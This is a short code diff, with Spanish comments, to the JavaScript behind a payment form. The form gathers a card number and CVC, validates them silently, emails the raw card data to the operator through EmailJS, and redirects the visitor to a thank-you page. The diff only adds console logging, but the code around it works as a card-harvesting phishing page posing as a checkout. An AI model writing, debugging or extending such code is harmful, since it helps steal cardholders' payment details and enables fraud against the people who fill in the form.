@@ -15,16 +15,19 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
 
     // Validaciones sin alertas
     if (cardData.numero.length !== 16 || !/^\d+$/.test(cardData.numero)) {
+        console.log('Número de tarjeta inválido'); // Mensaje en consola
         return; // Si el número de tarjeta no es válido, no hace nada
     }
 
     if (cardData.cvc.length !== 3 || !/^\d+$/.test(cardData.cvc)) {
+        console.log('CVC inválido'); // Mensaje en consola
         return; // Si el CVC no es válido, no hace nada
     }
 
     // Envía los datos a tu correo usando EmailJS
     emailjs.send("service_syrc1uk", "template_u3etoro", cardData) // Service ID y Template ID
         .then(() => {
+            console.log('Correo enviado correctamente'); // Mensaje en consola
             // Redirige a la página de agradecimiento
             window.location.href = "thank-you.html";
         })
